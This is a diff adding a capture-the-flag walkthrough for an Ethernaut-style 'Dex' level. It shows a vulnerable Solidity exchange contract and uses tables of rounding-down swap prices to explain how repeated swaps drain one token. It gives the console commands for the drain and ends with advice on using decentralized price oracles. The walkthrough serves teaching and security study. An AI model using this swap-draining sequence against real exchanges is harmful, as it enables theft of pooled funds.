@@ -1474,6 +1474,153 @@ But, we can't track the number of `price()` invocation in `Buyer` contract becau
 
 ### Level 22. Dex
 
+Useful links:
+
+- [ERC20 Token Standard](https://eips.ethereum.org/EIPS/eip-20)
+- Solidity [division operation](https://docs.soliditylang.org/en/v0.8.11/types.html#division)
+
+**Goal**: `player` has to drain all of at least one of the two tokens - `token1` and `token2` from the basic [DEX](https://en.wikipedia.org/wiki/Decentralized_finance#Decentralized_exchanges) contract.
+
+Given contract:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.6.0;
+
+import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
+import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
+import '@openzeppelin/contracts/math/SafeMath.sol';
+
+contract Dex  {
+  using SafeMath for uint;
+  address public token1;
+  address public token2;
+  constructor(address _token1, address _token2) public {
+    token1 = _token1;
+    token2 = _token2;
+  }
+
+  function swap(address from, address to, uint amount) public {
+    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
+    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
+    uint swap_amount = get_swap_price(from, to, amount);
+    IERC20(from).transferFrom(msg.sender, address(this), amount);
+    IERC20(to).approve(address(this), swap_amount);
+    IERC20(to).transferFrom(address(this), msg.sender, swap_amount);
+  }
+
+  function add_liquidity(address token_address, uint amount) public{
+    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
+  }
+
+  function get_swap_price(address from, address to, uint amount) public view returns(uint){
+    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
+  }
+
+  function approve(address spender, uint amount) public {
+    SwappableToken(token1).approve(spender, amount);
+    SwappableToken(token2).approve(spender, amount);
+  }
+
+  function balanceOf(address token, address account) public view returns (uint){
+    return IERC20(token).balanceOf(account);
+  }
+}
+
+contract SwappableToken is ERC20 {
+  constructor(string memory name, string memory symbol, uint initialSupply) public ERC20(name, symbol) {
+        _mint(msg.sender, initialSupply);
+  }
+}
+```
+
+The vulnerability originates from `get_swap_price` method which determines the exchange rate between tokens in the Dex. The division in it won't always calculate to a perfect integer, but a fraction. And there is **_NO_** fraction types in Solidity. Instead, _division rounds towards zero_. according to docs. For example, `3 / 2 = 1` in solidity.
+
+We're going to swap all of our `token1` for `token2`. Then swap all our `token2` to obtain `token1`, then swap all our `token1` for `token2` and so on.
+
+Here's how the price history & balances would go. Initially,
+
+|  DEX   |        | player |        |
+| :----: | :----: | :----: | :----: |
+| token1 | token2 | token1 | token2 |
+|  100   |  100   |   10   |   10   |
+
+After swapping all of `token1`:
+
+|  DEX   |        | player |        |
+| :----: | :----: | :----: | :----: |
+| token1 | token2 | token1 | token2 |
+|  100   |  100   |   10   |   10   |
+|  110   |   90   |   0    |   20   |
+
+Note that at this point exchange rate is adjusted. Now, exchanging 20 `token2` should give 20 \* 110 / 90 = 24.44... But since division results in integer we get 24 `token2`. Price adjusts again. Swap again.
+
+|  DEX   |        | player |        |
+| :----: | :----: | :----: | :----: |
+| token1 | token2 | token1 | token2 |
+|  100   |  100   |   10   |   10   |
+|  110   |   90   |   0    |   20   |
+|   86   |  110   |   24   |   0    |
+
+Notice that on each swap we get more of `token1` or `token2` than held before previous swap. This is due to the inaccuracy of price calculation in `get_swap_price` method.
+
+Keep swapping and we'll get:
+
+|  DEX   |        | player |        |
+| :----: | :----: | :----: | :----: |
+| token1 | token2 | token1 | token2 |
+|  100   |  100   |   10   |   10   |
+|  110   |   90   |   0    |   20   |
+|   86   |  110   |   24   |   0    |
+|  110   |   80   |   0    |   30   |
+|   69   |  110   |   41   |   0    |
+|  110   |   45   |   0    |   65   |
+
+Now, at the last swap above we've gotten hold of 65 `token2`, which is more than enough to drain all of 110 token1! By simple calculation, only 45 of token2 is required to get all 110 of `token1`.
+
+|  DEX   |        | player |        |
+| :----: | :----: | :----: | :----: |
+| token1 | token2 | token1 | token2 |
+|  100   |  100   |   10   |   10   |
+|  110   |   90   |   0    |   20   |
+|   86   |  110   |   24   |   0    |
+|  110   |   80   |   0    |   30   |
+|   69   |  110   |   41   |   0    |
+|  110   |   45   |   0    |   65   |
+|   0    |   90   |  110   |   20   |
+
+Jump into console. First approve the contract to transfer your tokens with a big enough allowance so that we don't have to approve again & again. Allowance of 500 should be more than enough:
+
+```js
+await contract.approve(contract.address, 500);
+```
+
+Get token addresses:
+
+```js
+t1 = await contract.token1();
+t2 = await contract.token2();
+```
+
+```js
+await contract.swap(t1, t2, 10);
+await contract.swap(t2, t1, 20);
+await contract.swap(t1, t2, 24);
+await contract.swap(t2, t1, 30);
+await contract.swap(t1, t2, 41);
+await contract.swap(t2, t1, 45);
+```
+
+The integer math portion aside, getting prices or any sort of data from any single source is a massive attack vector in smart contracts.
+
+You can clearly see from this example, that someone with a lot of capital could manipulate the price in one fell swoop, and cause any applications relying on it to use the the wrong price.
+
+The exchange itself is decentralized, but the price of the asset is centralized, since it comes from 1 dex. This is why we need [oracles](https://betterprogramming.pub/what-is-a-blockchain-oracle-f5ccab8dbd72). Oracles are ways to get data into and out of smart contracts. We should be getting our data from multiple independent decentralized sources, otherwise we can run this risk.
+
+[Chainlink Data Feeds](https://docs.chain.link/docs/get-the-latest-price/) are a secure, reliable, way to get decentralized data into your smart contracts. They have a vast library of many different sources, and also offer [secure randomness](https://docs.chain.link/docs/chainlink-vrf/), ability to make [any API call](https://docs.chain.link/docs/make-a-http-get-request/), [modular oracle network creation](https://docs.chain.link/docs/architecture-decentralized-model/), [upkeep, actions, and maintenance](https://docs.chain.link/docs/chainlink-keepers/introduction/), and unlimited customization.
+
+[Uniswap TWAP Oracles](https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles) relies on a time weighted price model called [TWAP](https://en.wikipedia.org/wiki/Time-weighted_average_price#). While the design can be attractive, this protocol heavily depends on the liquidity of the DEX protocol, and if this is too low, prices can be easily manipulated.
+
 ### Level 23. Dex Two
 
 ### Level 24. Puzzle Wallet
